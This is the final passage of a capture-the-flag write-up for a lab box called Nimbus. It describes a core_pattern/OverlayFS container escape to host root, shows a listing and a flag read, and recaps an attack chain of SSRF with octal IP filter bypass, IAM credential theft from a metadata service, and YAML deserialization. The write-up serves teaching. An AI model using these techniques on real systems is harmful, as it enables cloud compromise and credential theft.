Raising the core-dump size limit to unlimited and then letting a process crash (or simply waiting for any process on the shared host kernel to segfault) is enough to fire the `core_pattern` handler. The moment that happens, the host kernel executes our script — as **host root** — which reads the real `/root/root.txt` from the actual host filesystem and writes a copy into our shared upperdir path, immediately making it visible inside our container too.

### Step 5 — Read the flag

```shell
[root@55dd84e3851a /]# ls -al
ls -al
total 76
drwxr-xr-x   1 root  root 4096 Sep 13 23:56 .
drwxr-xr-x   1 root  root 4096 Sep 13 23:56 ..
-rwxr-xr-x   1 root  root    0 Sep 13 23:56 .dockerenv
dr-xr-xr-x   2 root  root 4096 Jun 25  2024 afs
drwxrwxr-x   1 floci root 4096 May 18 05:42 app
lrwxrwxrwx   1 root  root    7 Jun 25  2024 bin -> usr/bin
dr-xr-xr-x   2 root  root 4096 Jun 25  2024 boot
drwxr-xr-x   3 root  root 4096 Sep 13 23:56 codebuild
drwxr-xr-x  15 root  root 3840 Sep 13 23:56 dev
drwxr-xr-x   1 root  root 4096 Sep 13 23:56 etc
-rwxr-xr-x   1 root  root  219 Sep 13 23:57 exploit_root.sh
drwxr-xr-x   2 root  root 4096 Jun 25  2024 home
lrwxrwxrwx   1 root  root    7 Jun 25  2024 lib -> usr/lib
lrwxrwxrwx   1 root  root    9 Jun 25  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root  root 4096 Jun 25  2024 media
drwxr-xr-x   2 root  root 4096 Jun 25  2024 mnt
drwxr-xr-x   2 root  root 4096 Jun 25  2024 opt
dr-xr-xr-x 311 root  root    0 Sep 13 23:56 proc
dr-xr-x---   3 root  root 4096 May 12 05:07 root
-rwxrwxrwx   1 root  root   33 Sep 13 23:58 rootflag.txt
drwxr-xr-x   6 root  root 4096 May 12 05:07 run
lrwxrwxrwx   1 root  root    8 Jun 25  2024 sbin -> usr/sbin
drwxr-xr-x   2 root  root 4096 Jun 25  2024 srv
dr-xr-xr-x  13 root  root    0 Sep 13 23:56 sys
drwxrwxrwt   2 root  root 4096 Jun 25  2024 tmp
drwxr-xr-x   1 root  root 4096 May 12 05:07 usr
drwxr-xr-x   1 root  root 4096 May 12 05:07 var
```

There it is — `rootflag.txt`, sitting right at `/`, world-readable at `777`, exactly as our script instructed:

```shell
[root@55dd84e3851a /]# cat rootflag.txt
cat rootflag.txt
[REDACTED]
```

And that's full ownership of Nimbus — starting from a single exposed web port, through a chained SSRF that bypassed an IP filter with octal encoding to steal live IAM credentials from a spoofed AWS Instance Metadata Service, into an unsafe YAML deserialization bug in an SQS-driven job worker, and finally through an intentionally-privileged CodeBuild container escalated straight into host-level root via a classic `core_pattern` / OverlayFS `upperdir` container escape. A really satisfying reminder that "cloud-native" architectures introduce their own entirely new category of misconfigurations — right alongside the classic ones.
